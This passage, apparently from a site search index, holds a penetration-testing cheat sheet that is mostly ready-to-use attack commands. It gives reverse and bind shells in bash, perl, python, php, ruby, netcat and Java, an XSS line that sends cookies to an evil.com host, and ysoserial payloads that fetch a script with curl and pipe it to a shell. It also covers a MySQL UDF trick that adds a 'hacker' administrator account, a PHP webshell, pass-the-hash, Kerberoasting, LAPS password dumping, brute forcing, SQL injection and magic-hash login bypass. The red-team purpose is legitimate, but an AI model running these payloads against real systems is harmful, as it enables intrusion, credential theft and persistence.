py Example Default Profile 1 \"/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en\"","title":"C2 Profiles"},{"location":"blogs/2019/penetration-testing-pasties/#linux","text":"","title":"Linux"},{"location":"blogs/2019/penetration-testing-pasties/#bash","text":"BASH loop example 1 2 3 4 for u in ` cat hosts . txt ` ; do echo - n \" [*] user: $u \" && \\ proxychains python / usr / local / bin / secretsdump . py domain / username @$ u - hashes aad3b435b51404eeaad3b435b51404ee : 0 e493911f561a425e7a905329f4454bf | tee user_brute . log done BASH .bashrc Function Example 1 2 3 function start_sshtunnel () { ssh - A - t - p22 - L 8800 : localhost : 8800 james @123.001.123 - t ssh - L 8800 : localhost : 80 james @124.125.123 } Quick BASH format .bash_profile (mod ipconfig > ifconfig for Linux) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # . bash_profile PATH = $ PATH : / home / james / export PATH alias ls = ' ls -G ' alias grep = ' grep --color=auto ' alias la = ' ls -AlahG ' alias el = ' sudo $(history -p \\!\\!) ' alias ll = ' ls -alF ' alias l = ' ls -CF ' alias lg = ' ls -AlahG |grep $1 ' alias netstati = ' lsof -P -i -n ' export PS1 = \" \\n\\n \\[\\$(if [[ \\$? == 0 ]]; then echo \\ \" \\[$ GREEN \\]\u2713\\ \" ; else echo \\ \" \\[$ RED \\]\u2715\\ \" ; fi)[\\033[33m\\]\\D{%Y%m%d_%H%M%S}\\[\\033[m\\] \\[\\033[36m\\]\\u@\\h__`ipconfig getifaddr en0`__`ipconfig getifaddr en8`\\[\\033[m\\]] \\[\\033[1;31m\\] \\n [\\w]\\[\\033[m\\] \\n \\$ Create NTLM Hash from Mac CLI 1 echo - n password | iconv - t UTF - 16 LE | openssl md4","title":"BASH"},{"location":"blogs/2019/penetration-testing-pasties/#linux-persistence-ideas","text":"1 2 3 4 Cron Add SSH keys Add SUID to world - writeable script ( chmod u + s < file > ) Add init script ( reboot persistence )","title":"Linux Persistence Ideas"},{"location":"blogs/2019/penetration-testing-pasties/#rpcclient","text":"http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions 1 2 3 4 5 6 rpcclient - U \"\" - N < WinIPaddr > rpcclient - U < username > < WinIPaddr > rpcclient $ > srvinfo rpcclient $ > enum rpcclient $ > enumdomusers rpcclient $ > queryuser 500 Password bruteforce via rpcclient 1 2 3 4 for u in ` cat users_sorted . txt ` ; do echo - n \" [*] user: $u \" && \\ proxychains rpcclient - U \" domain\\$u%$u \" - c \" getusername;quit \" 10 . 9 . 8 . 40 done Pass the Hash Variant 1 pth - rpcclient - U \"domain\\name%hash\" --pw-nt-hash 10.4.128.41","title":"rpcclient"},{"location":"blogs/2019/penetration-testing-pasties/#enum4linux","text":"Domain Controller Anonymous Enumeration 1 enum4linux - A <ip> | tee <ip> - anon-enum . txt","title":"enum4linux"},{"location":"blogs/2019/penetration-testing-pasties/#iptables","text":"Append rules to top of the Input filter and make persistent 1 2 3 4 / sbin / iptables - I INPUT - p tcp --dport 50050 -s <ip address> -j ACCEPT / sbin / iptables - I INPUT - p tcp --dport 22 -s <ip address> -j ACCEPT service netfilter - persistent save iptables - L - v Delete rule 1 iptables - D INPUT - i eth0 - p tcp --dport 443 -j ACCEPT","title":"iptables"},{"location":"blogs/2019/penetration-testing-pasties/#ldapsearch","text":"Obtain LAPS passwords for domain computers using the linux based ldapsearch tool Dump Laps Passwords with LDAPSearch by Rob Fuller 1 2 3 4 5 6 7 8 ldapsearch - x - h 192 . 168 . 80 . 10 - D \" helpdesk \" - w ASDqwe123 - b \" dc=sittingduck,dc=info \" \" (ms-MCS-AdmPwd=*) \" ms - MCS - AdmPwd - x - Use basic authentication - h 192 . 168 . 80 . 10 - Connect to the Domain Controller for ldap - D \" helpdesk \" - w ASDqwe123 - Login as the helpdesk user , with the password ASDqwe123 - b \" dc=sittingduck,dc=info \" - This loads the base LDAP object of the entire domain . \" (ms-MCS-AdmPwd=*) \" - Filter out any objects that I can \u2019 t see a value for ms - MCS - AdmPwd for . ( If you have rights as that user to see even one Administrator password , this will show it . ) ms - MCS - AdmPwd - Only show me the ms - MCS - AdmPwd object ( which by default includes the object name and DN so you will still know what host it belongs to )","title":"ldapsearch"},{"location":"blogs/2019/penetration-testing-pasties/#nfs","text":"List NFS Mounts on remote host 1 showmount - e < ipaddr > Check NFS share counts in a loop 1 2 3 4 5 6 7 8 # cat nfs . results . msf | grep -| cut - d ' - ' - f2 | cut - d ' ' - f2 , 5 | sed ' s/ /:/g ' for server in $ ( cat nfs . shares ) ; do echo \" [*] Checking $server \" mount - o nolock , nfsvers = 3 $ server / mnt / n4s_backup ls / mnt / n4s_backup umount / mnt / n4s_backup done","title":"NFS"},{"location":"blogs/2019/penetration-testing-pasties/#shells","text":"","title":"Shells"},{"location":"blogs/2019/penetration-testing-pasties/#tty-shells","text":"http://pentestmonkey.net/blog/post-exploitation-without-a-tty Upgrade your shell to a full TTY 1 2 3 4 5 6 7 8 9 10 11 12 13 python - c 'import pty; pty.spawn(\"/bin/sh\")' echo os . system ( '/bin/bash' ) / bin / sh - i perl \u2014 e 'exec \"/bin/sh\";' perl : exec \"/bin/sh\" ; ruby : exec \"/bin/sh\" lua : os . execute ( '/bin/sh' ) (From within IRB) 1 exec \" /bin/sh \" (From within vi) 1 : ! bash (From within vi) 1 : set shell =/ bin / bash : shell (From within nmap) 1 ! sh","title":"TTY Shells"},{"location":"blogs/2019/penetration-testing-pasties/#bind-shells","text":"https://github.com/infodox/exploits/blob/master/payloads/linux/perl.py Perl Bind Shell (Port 1000) 1 perl - e ' use Socket;$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/usr/bin/bash -i\");}; '","title":"Bind Shells"},{"location":"blogs/2019/penetration-testing-pasties/#reverse-shells","text":"Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10): 1 bash - i >& / dev / tcp / 10 . 0 . 0 . 1 / 8080 0 >& 1 PERL Here\u2019s a shorter, feature-free version of the perl-reverse-shell: 1 perl - e ' use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}; ' Python This was tested under Linux / Python 2.7: 1 python - c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' PHP This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn\u2019t work, try 4, 5, 6\u2026 1 php - r ' $sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ' Ruby 1 ruby - rsocket - e ' f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f) ' Netcat Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don\u2019t support the -e option. 1 nc - e / bin / sh 10 . 0 . 0 . 1 1234 If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this: 1 rm / tmp / f ; mkfifo / tmp / f ; cat / tmp / f |/ bin / sh - i 2 >& 1 | nc 10 . 0 . 0 . 1 1234 >/ tmp / f Java 1 2 3 r = Runtime . getRuntime () p = r . exec ( [ \" /bin/bash \" , \" -c \" , \" exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done \" ] as String [] ) p . waitFor () xterm One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. 1 xterm - display 10 . 0 . 0 . 1 : 1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): 1 Xnest : 1 your\u2019ll need to authorise the target to connect to you (command also run on your host): 1 xhost + targetip","title":"Reverse Shells"},{"location":"blogs/2019/penetration-testing-pasties/#ssh-tunnels","text":"Send data over ssh to port 9000 on target 1 ssh - L 8090 : localhost : 9000 james @123.123.123 Send data over ssh to port 80 on target through jumphost 1 ssh - A - t - p22 - L 8800 : localhost : 8800 james @123.001.123.321 - t ssh - L 8800 : localhost : 80 james @124.123.122 Start ssh using existing connections 1 2 3 nano ~/ . ssh / config ControlMaster auto ControlPath ~/ . ssh / control : % h : % p : % r","title":"SSH Tunnels"},{"location":"blogs/2019/penetration-testing-pasties/#impacket","text":"Source: https://github.com/CoreSecurity/impacket/releases/tag/impacket_0_9_15","title":"Impacket"},{"location":"blogs/2019/penetration-testing-pasties/#install-impacket-on-windows","text":"1 git clone https : // github . com / CoreSecurity / impacket . git Download VC++ For Python 2.7 (Needed to compile some modules) https://www.microsoft.com/en-us/download/details.aspx?id=44266 Install necessary modules (You may need to install pip first) 1 python - m pip install pycrypto pyasn1 pyOpenSSL pyReadline ldapdomaindump You can also download the PyCrypto binary if it fails to compile http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe","title":"Install impacket on Windows"},{"location":"blogs/2019/penetration-testing-pasties/#secretsdump","text":"Attempt to dump credentials from a remote machine via Pass the Hash 1 python secretsdump . py . / localadmin @computername . domain . com - hashes aad3b435b51404eeaad3b435b51404ee : 21306681 c738c3ed2d615e29be1574a3 Dump domain password hashes remotely via Volume Shadow Copy 1 c : \\ users \\ username \\ appdata \\ local \\ temp \\ sd . exe domain / username : password @dchostname - just - dc - use - vss - outputfile","title":"Secretsdump"},{"location":"blogs/2019/penetration-testing-pasties/#getuserspnspy","text":"This is the easiest way to gather SPN tickets in the correct format for cracking with John or Hashcat Source: https://room362.com/post/2016/kerberoast-pt2/ 1 2 3 4 5 6 7 8 9 10 11 root @wpad : ~/ impacket / examples # . / GetUserSPNs . py - request sittingduck . info / notanadmin - dc - ip < target DC ip address > Impacket v0 .9.15 - dev - Copyright 2002 - 2016 Core Security Technologies Password : ServicePrincipalName Name MemberOf PasswordLastSet ---------------------------------- ---------- ---------------------------------------------------- ------------------- http / win10 . sittingduck . info uberuser CN = Enterprise Admins , CN = Users , DC = sittingduck , DC = info 2015 - 11 - 10 23 : 47 : 21 MSSQLSvc / WIN2K8R2 . sittingduck . info sqladmin01 2016 - 05 - 13 19 : 13 : 20 $ krb5tgs $ 23 $ * sqladmin01 $ SITTINGDUCK . INFO $ SPN * $ 6e5307 df490c6e3339f613fdc5655785 $ 80 ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283 $ krb5tgs $ 23 $ * uberuser $ SITTINGDUCK . INFO $ SPN * $ 27 c08ed2a8d5394f66e8c13c25c98393 $ 310 b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77","title":"GetUserSPNS.py"},{"location":"blogs/2019/penetration-testing-pasties/#smbrelayxpy","text":"https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&utm_source=Twitter&utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&utm_campaign=SANS+Pen+Test","title":"SMBRelayx.py"},{"location":"blogs/2019/penetration-testing-pasties/#brute-force-techniques","text":"RDP Brute 1 ncrack - u administrator - P 500 - worst - passwords . txt - p 3389 10 . 212 . 50 . 21 SSH Brute 1 medusa - M ssh - C / usr / share / wordlists / ssh . lst - H 22 . txt - T 10 | grep SUCCESS | tee medusa - results . txt Telnet Brute 1 medusa - M telnet - C / usr / share / wordlists / telnet . lst - H 23 . txt - T 10 - t 3 | grep SUCCESS | tee medusa - results . txt","title":"Brute Force Techniques"},{"location":"blogs/2019/penetration-testing-pasties/#web-exploitation","text":"","title":"Web Exploitation"},{"location":"blogs/2019/penetration-testing-pasties/#sql","text":"","title":"SQL"},{"location":"blogs/2019/penetration-testing-pasties/#sqli-examples","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 secret ' or 1=1 limit1;# # Find number of columns return by the Select statement ? id = 738 order by 1 , 2 , 3 , 4 ... n until error is received # Use union select statement to append query to the original # union Select statement must have same number of columns as original Select statement ? id = 738 union select 1 , 2 , 3 , 4 , 5 , 6 # Get DB Version ? id = 738 union select 1 , 2 , 3 , 4 ,@@ version , 6 # Get DBUser ? id = 738 union select 1 , 2 , 3 , 4 , user () , 6 # Get tables from all databases ? id = 738 union all select 1 , 2 , 3 , 4 , table_name , 6 FROM information_schema . tables # Get Table Columns ? id = 738 union select 1 , 2 , 3 , 4 , column_name , 6 FROM information_schema . columns where table_name = ' users ' # Get User passwords ? id = 738 union select 1 , 2 , 3 , 4 , concat ( name , 0 x3a , password ) , 6 FROM users","title":"SQLi Examples"},{"location":"blogs/2019/penetration-testing-pasties/#sql-joins","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # FULL All SELECT something FROM tableA A FULL OUTER JOIN tableB B ON A . KEY = B . KEY # A partial B SELECT something FROM tableA A LEFT JOIN tableB B on A . Key = B . Key # B Partial A SELECT something FROM tableA A RIGHT JOIN tableB B on A . Key = B . Key # A no B SELECT something FROM tableA A LEFT JOIN tableB B on A . Key = B . Key WHERE B . Key IS NULL # Outer SELECT something FROM tableA A FULL OUTER JOIN tableB B on A . Key = B . Key WHERE A . Key IS NULL OR B . Key IS NULL # Inner SELECT something FROM tableA A FULL INNER JOIN tableB B on A . Key = B . Key","title":"SQL Joins"},{"location":"blogs/2019/penetration-testing-pasties/#mysql","text":"1 2 3 4 5 6 7 8 9 10 [ mysqldir ] / bin / mysql - h hostname - u root -- password = pass < database > select @@ version select @@ servername mysql > show databases ; mysql > use [ db name ]; mysql > show tables ; mysql > describe [ table name ]; mysql > SELECT * FROM [ table name ];","title":"MySQL"},{"location":"blogs/2019/penetration-testing-pasties/#udf-install-for-command-execution","text":"User Defined Functions by Platform 1 2 3 4 udf / mysql / linux / 32 / lib_mysqludf_sys . so udf / mysql / linux / 64 / lib_mysqludf_sys . so udf / mysql / windows / 32 / lib_mysqludf_sys . dll udf / mysql / windows / 64 / lib_mysqludf_sys . dll Source: http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/ Load MYSQLUDF for Linux 1 2 3 4 5 6 7 8 use test ; create table udf ( line blob ); insert into udfvalues ( load_file ( '/tmp/udf/udf.so' )); select * from udfinto dumpfile '/usr/lib/udf.so' ; create function sys_exec returns integer soname 'udf.so' ; select sys_exec ( 'id > /tmp/out; chownapache.apache /tmp/out' ); select sys_exec ( 'ls -alh/root/Desktop/ >> /tmp/out' ); select sys_exec ( 'ls /etc/sudoers>> /tmp/out' ); Upload suid.c program 1 2 3 wget http : // ip : port / privex / mysql / suid - o / tmp / suid chownroot : root / tmp / suid chmod4777 / tmp / suid Load MYSQLUDFfor Windows 1 2 3 4 5 6 7 8 USE mysql ; CREATE TABLE npn ( line blob ); INSERT INTO npn values ( load_files ( 'C://xampplite//webdav//lib_mysqludf_sys.dll' )); SELECT * FROM mysql . npnINTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll' ; CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll' ; SELECT sys_exec ( \"net user hacker hacker1234!@#$ /add\" ); SELECT sys_exec ( \"net localgroupAdministrators hacker /add\" ); s_exec ( 'net localgroup\"Remote Desktop Users\" hacker /add' );","title":"UDF Install for Command Execution"},{"location":"blogs/2019/penetration-testing-pasties/#sqlmap","text":"Automated website crawl and test of SQLi 1 python sqlmap . py - u http : // example . com --forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3","title":"SQLMap"},{"location":"blogs/2019/penetration-testing-pasties/#xss","text":"Grab cookie 1 document . write ( '<img src=\"https://yourserver.evil.com/collect.gif?cookie=' + document . cookie + '\" />' ) XSS via image tag 1 < img src = \"x\" onerror = \"alert('Suck it, Trebek!')\" />","title":"XSS"},{"location":"blogs/2019/penetration-testing-pasties/#server-side-javascript-injection-via-node-or-elementjs","text":"File system directory listing 1 res . end ( require ( ' fs ' ) . readdirSync ( ' . ' ) . toString ()) File read 1 res . end ( require ( ' fs ' ) . readFileSync ( ' /etc/passwd ' ) . toString ())","title":"Server-side Javascript Injection via Node or ElementJS"},{"location":"blogs/2019/penetration-testing-pasties/#cold-fusion","text":"Sources: JMPESPJUMP - Attacking Adobe Cold Fusion Decrypt CFM Files back to source https://github.com/disccomp/cfdecrypt CF RDS Logon Bypass (Create this html file locally and submit to obtain a auth session) 1 2 3 4 5 <form action= \"http://[HOSTNAME:PORT]/CFIDE/adminapi/administrator.cfc?method=login\" method= \"post\" > <input name= \"adminpassword\" type= \"hidden\" value= \"\" /> <input name= \"rdsPasswordAllowed\" type= \"hidden\" value= \"1\" /> <input type= \"submit\" /> </form> For ColdFusion 6 and 7 the passwords for DataSources encrypted in the following XML files: [ColdFusion_Install_Dir]\\lib\\neo-query.xml For ColdFusion 8, 9 and 10: [ColdFusion_Install_Dir]\\lib\\neo-datasource.xml","title":"Cold Fusion"},{"location":"blogs/2019/penetration-testing-pasties/#java","text":"","title":"Java"},{"location":"blogs/2019/penetration-testing-pasties/#jboss","text":"Default credential is \"admin:admin\" 1 2 3 4 5 0 . Host your . jar / . war payload with webshell on local webserver 1 . Navigate to the JMX Console on the target host ( http : // IP . Ad . dr . ess : port / jmx - console / ) and search for \u201c service = MainDeployer \u201d. 2 . From here you \u2019 ll want to utilize the deploy () function since it allows you to enter a URL as a parameter value in java . net . URL . In this field , enter your attack IP and the name of the WAR file in the URL box and then click the \u201c Invoke \u201d button . Other ways to gain execution 1 2 3 4 5 6 7 8 * jboss . deployment * jboss . system ( MainDeployer ) * http : // localhost : 8080 / invoker / JMXInvokerServlet * Java Deserialization Vuln via JMXInvokerServlet * https : // www . redteam - pentesting . de / en / publications / jboss /- bridging - the - gap - between - the - enterprise - and - you - or - whos - the - jboss - now * https : // github . com / frohoff / ysoserial * https : // jitpack . io / com / github / frohoff / ysoserial / master - SNAPSHOT / ysoserial - master - SNAPSHOT . jar * https : // www . cigital . com / blog / mitigate - java - deserialization - vulnerability - jboss / Auto-check and exploitation tool ( https://github.com/joaomatosf/jexboss ) 1 2 3 4 5 git clone https : // github . com / joaomatosf / jexboss . git cd jexboss pip install - r requires . txt python jexboss . py - h python jexboss . py - host http : // target_host : 8080","title":"JBOSS"},{"location":"blogs/2019/penetration-testing-pasties/#java-deserialization","text":"Java Deserialization Cheat Sheet How to get a full shell through Java Runtime.exec Ysoserial payload to execute full commands 1 sh - c $ @| sh . < payload here > Generate a ysoserial payload to tell server to download further commands via curl and pipe to shell 1 java - jar ysoserial - 0 . 0 . 4 - all . jar CommonsCollections1 'sh -c $@|sh . curl http://10.42.65.40/commands.sh |sh' > jenkins_curl_shell . bin Generate a ysoserial payload to execute nc bind shell 1 java - jar ysoserial - 0 . 0 . 4 - all . jar CommonsCollections1 'sh -c $@|sh . nc -lp 8088 -e /bin/bash' > nc - jenkins . out","title":"Java Deserialization"},{"location":"blogs/2019/penetration-testing-pasties/#jmxinvokerservlet","text":"1 . / ysoserial - master - v0 . 0 . 4 - gad26e2b - 61 . jar CommonsCollections5 \"touch /tmp/pwned\" > payload . txt Generate payload with yososerial and send with Burp. You will get a jboss.invocation.InvocationException response on success or failure. Ensure the headers match these: 1 2 3 4 POST / invoker / JMXInvokerServlet HTTP / 1 . 1 Host : < hostname / IP > : 8080 Content-Type : application / x-java-serialized-object ; class = org . jboss . invocation . MarshalledValue Content-Length : 2083","title":"JMXInvokerServlet"},{"location":"blogs/2019/penetration-testing-pasties/#php","text":"LFI Read File (without executing) 1 www . example . com / index . php ? page = php : // filter / read = convert . base64 - encode / resource = config . php LFI Read PHP session file for current sessionid 1 http : // blog . target . org / blog . php ? page =/ var / lib / php5 / sess_th3cr1i5cm6m3dq98pb2sn9qg5 Create PHP backdoor/shell (windows): 1 echo ^ <?php echo passthru ( $_GET [ 'cmd' ]); ?^> > C : \\inetpub\\wwwroot\\s . php PHP Command Execution Example 1 2 3 4 Url / page . php ? page = system & help = cmd @extract ( $ _REQUEST ); @die ( $ page ( $ help ));","title":"PHP"},{"location":"blogs/2019/penetration-testing-pasties/#php-type-juggling","text":"Bypass login authentication with PHP Type juggling by forcing a null condition in a string comparison. Add [] after a POST parameter \"?user_id[]=user22\" to force a NULL (zero-like) condition when comparing a string and an array","title":"PHP Type Juggling"},{"location":"blogs/2019/penetration-testing-pasties/#web-sockets","text":"There are still relatively few dec ent Web Socket testing tools and most aren't very mature: BurpSuite - Limited options to view web socket communication, but no ability to edit or replay traffic ZAP Proxy - Ability to modify, replay, and fuzz web sockets, but still relatively clumsy WSSiP - WebSocket Manipulation Proxy - Application for capturing, modifying and sending custom WebSocket data from client to server and vice versa.","title":"Web Sockets"},{"location":"blogs/2019/penetration-testing-pasties/#misc","text":"Things that don't seem to fit elsewhere!","title":"Misc"},{"location":"blogs/2019/penetration-testing-pasties/#decompiling-net-binaries","text":"http://ilspy.net/","title":"Decompiling .NET Binaries"},{"location":"blogs/2019/penetration-testing-pasties/#canary-tokens","text":"Tokens consist of a unique identifier (which can be embedded in either HTTP URLs or in hostnames.) Whenever that URL is requested, or the hostname is resolved, we send a notification email to the address tied to the token. You can get one in seconds, using just your browser. To obtain a token: 1 2 3 4 5 1 . Visit http : // canarytokens . org . 2 . Enter your email address . ( It ' s only used to notify you when the token is triggered, mails are not used for any other purpose.) 3 . Enter a comment which describes where you ' re using the token. If the token is triggered in six months time, a comment will help you remember where you placed the token. Be specific (e.g. \"file watch on 192.168.100.2:/repos/repo3/README.txt\" or \"Password lure email in user@domain.com inbox\". We envisage having loads of tokens, so a good description is necessary. 4 . Click \" Generate Token \" to obtain your token . 5 . Copy the token and drop it somewhere it will be stumbled over . Canarytokens.org","title":"Canary Tokens"},{"location":"blogs/2019/penetration-testing-pasties/#python-ssl-web-server","text":"Create PEM file 1 openssl req - newkey rsa : 2048 - x509 - keyout cakey . pem - out cacert . pem - days 3650 To concatenate the private key and public certificate into a pem file (which is required for many web-servers ) : 1 cat cakey . pem cacert . pem > server . pem Python code 1 2 3 4 5 6 import BaseHTTPServer , SimpleHTTPServer import ssl httpd = BaseHTTPServer . HTTPServer (( 'localhost' , 4443 ), SimpleHTTPServer . SimpleHTTPRequestHandler ) httpd . socket = ssl . wrap_socket ( httpd . socket , certfile = './server.pem' , server_side = True ) httpd . serve_forever ()","title":"Python SSL Web Server"},{"location":"blogs/2019/penetration-testing-pasties/#mcafee-sitelistxml-decryption","text":"Sometimes DA and other admin level account passwords are stored in Sitelist.xml files on local hosts 1 2 3 4 5 type \"C:\\ProgramData\\McAfee\\Common Framework\\SiteList.xml\" | findstr Password \u2570 $ . / mcafee_sitelist_pwd_decrypt . py f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR / abAFPM9B3Q == Crypted password : f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR / abAFPM9B3Q == Decrypted password : < empty > https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Get-SiteListPassword.ps1 1 git clone https : // github . com / funoverip / mcafee - sitelist - pwd - decryption","title":"McAfee SiteList.xml decryption"},{"location":"blogs/2019/penetration-testing-pasties/#tightvnc-password-retrieval","text":"Retrieve TightVNC registry keys 1 reg query HKEY_LOCAL_MACHINE \\ SOFTWARE \\ TightVNC \\ server Copy password from reg query output 1 2 Password REG_BINARY 7228098734 BBBA06 ControlPassword REG_BINARY 435 D7A037B9FDC2B Download vncpwd.exe or other VNC password decoder 1 wine vncpwd . exe 7228098734 BBBA06","title":"TightVNC Password Retrieval"},{"location":"blogs/2019/penetration-testing-pasties/#password-lists","text":"https://github.com/danielmiessler/SecLists.gits","title":"Password Lists"},{"location":"blogs/2019/penetration-testing-pasties/#aix-passwords","text":"/etc/security/passwd Convert AIX passwd file to john format 1 cat $ 1 | egrep \":|password\" | sed 's/password = //g' | tr - d \"\\t \" | sed ':a;N;$!ba;s/:\\n/:/g'","title":"AIX Passwords"},{"location":"blogs/2019/penetration-testing-pasties/#create-ntlm-hash-from-mac-cli","text":"1 echo - n password | iconv - t UTF - 16 LE | openssl md4","title":"Create NTLM Hash from Mac CLI"},{"location":"blogs/2019/penetration-testing-pasties/#hash-cracking-examples","text":"ophcrack using tables 1 ophcrack - d / Volumes / data / table_vista_free / - t / Volumes / data / table_vista_free - f ~/ Desktop / ntlm . hashdump Crack mscachev2 format with Hashcat (extremely slow) 1 . / hashcat - m 2100 - a 0 mscachev2 . dump . / wordlists /* -r rules/dive.rule Hashcat SPNs with wordlist 1 . / hashcat - m 13100 - a 0 spns . dump . / wordlists /* -r rules/dive.rule JTR SPNs with wordlist 1 . / john --format=krb5tgs spns.dump --wordlist=","title":"Hash Cracking Examples"},{"location":"blogs/2019/penetration-testing-pasties/#magic-hashes","text":"Source: https://www.whitehatsec.com/blog/magic-hashes/ Use Case 1: Use the \u201cMagic\u201d Number below as a password or as a string that you expect to be hashed. When it is compared against the hash of the actual value, and if they both are treated as \u201c0\u201d and therefore evaluated as true, you will be able to log into the account without the valid password. This could be forced to happen in environments where automatic passwords are chosen for users during a forgot password flow and then attempting to log in immediately afterwards, as an example. https://example.com/login.php?user=bob&pass=240610708 Use Case 2: The attacker can simply take the example in the Hash column in the table below and use it as a value. In some cases these values are simply done as a look-up against known values (in memory, or perhaps dumped from a database and compared). By simply submitting the hash value, the magic hash may collide with other hashes which both are treated as \u201c0\u201d and therefore compare to be true. This could be caused to happen https://example.com/login.php?user=bob&token=0e462097431906509019562988736854 Hashes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 HashType HashLength \u201c Magic \u201d Number Magic Hash Found By md2 32 505144726 0 e015339760548602306096794382326 WhiteHat Security , Inc . md4 32 48291204 0 e266546927425668450445617970135 WhiteHat Security , Inc . md5 32 240610708 0 e462097431906509019562988736854 Michal Spacek sha1 40 10932435112 0 e07766915004133176347055865026311692244 Independently found by Michael A . Cleverly & Michele Spagnuolo & Rogdham sha224 56 sha256 64 sha384 96 sha512 128 ripemd128 32 315655854 0 e251331818775808475952406672980 WhiteHat Security , Inc . ripemd160 40 20583002034 00 e1839085851394356611454660337505469745 Michael A Cleverly ripemd256 64 ripemd320 80 whirlpool 128 tiger128 , 3 32 265022640 0 e908730200858058999593322639865 WhiteHat Security , Inc . tiger160 , 3 40 13181623570 00 e4706040169225543861400227305532507173 Michele Spagnuolo tiger192 , 3 48 tiger128 , 4 32 479763000 00 e05651056780370631793326323796 WhiteHat Security , Inc . tiger160 , 4 40 62241955574 0 e69173478833895223726165786906905141502 Michele Spagnuolo tiger192 , 4 48 snefru 64 snefru256 64 gost 64 adler32 8 FR 00 e00099 WhiteHat Security , Inc . crc32 8 2332 0 e684322 WhiteHat Security , Inc . crc32b 8 6586 0 e817678 WhiteHat Security , Inc . fnv132 8 2186 0 e591528 WhiteHat Security , Inc . fnv164 16 8338000 0 e73845709713699 WhiteHat Security , Inc . joaat 8 8409 0 e074025 WhiteHat Security , Inc . haval128 , 3 32 809793630 00 e38549671092424173928143648452 WhiteHat Security , Inc . haval160 , 3 40 18159983163 0 e01697014920826425936632356870426876167 Independently found by Michael Cleverly & Michele Spagnuolo haval192 , 3 48 48892056947 0 e4868841162506296635201967091461310754872302741 Michael A . Cleverly haval224 , 3 56 haval256 , 3 64 haval128 , 4 32 71437579 0 e316321729023182394301371028665 WhiteHat Security , Inc . haval160 , 4 40 12368878794 0 e34042599806027333661050958199580964722 Michele Spagnuolo haval192 , 4 48 haval224 , 4 56 haval256 , 4 64 haval128 , 5 32 115528287 0 e495317064156922585933029613272 WhiteHat Security , Inc . haval160 , 5 40 33902688231 00 e2521569708250889666329543741175098562 Michele Spagnuolo haval192 , 5 48 52888640556 0 e9108479697641294204710754930487725109982883677 Michele Spagnuolo haval224 , 5 56 haval256 , 5 64","title":"Magic Hashes"},{"location":"blogs/2020/red-team-development-and-operations/","text":"Red Team Development and Operations Book \u00b6 James Tubberville | January 20, 2020 | Tweet This Post: \"Red Team Development and Operations\", Zero-Day Edition Joe Vest ( @joevest ) and James Tubberville ( @minis_io ) We are excited to announce the release of our new book Red Team Development and Operations \u00b6 This book is the culmination of years of experience in the information technology and cybersecurity field. Components of the book have existed as rough notes, ideas, informal and formal processes developed and/or adopted by the authors as we led and executed Red Team engagements over many years. These components have been used to successfully plan, 